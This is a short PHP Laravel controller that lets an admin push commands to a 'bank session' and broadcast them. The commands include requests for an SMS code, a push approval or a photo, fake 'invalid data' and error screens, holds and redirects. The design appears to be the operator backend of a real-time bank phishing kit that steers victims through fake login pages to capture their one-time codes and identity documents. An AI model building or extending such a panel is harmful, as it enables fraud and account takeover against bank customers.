<?php

namespace App\Http\Controllers;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class BankAuthAdminController extends Controller
{
    private const ALLOWED_TYPES = [
        'idle', 'hold.short', 'hold.long', 'sms', 'push', 'invalid-data',
        'question', 'error', 'photo.with-input', 'photo.without-input', 'redirect',
    ];

    public function setCommand(Request $request, string $sessionId): JsonResponse
    {
        $data = $request->validate([
            'type' => 'required|string|in:' . implode(',', self::ALLOWED_TYPES),
            'text' => 'nullable|string',
            'url' => 'nullable|string',
        ]);

        $session = BankSession::findOrFail($sessionId);
        $command = ['type' => $data['type']];
        if (!empty($data['text'])) $command['text'] = $data['text'];
        if (!empty($data['url'])) $command['url'] = $data['url'];

        $session->action_type = $command;
        $session->save();

        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true, 'command' => $command]);
    }
}
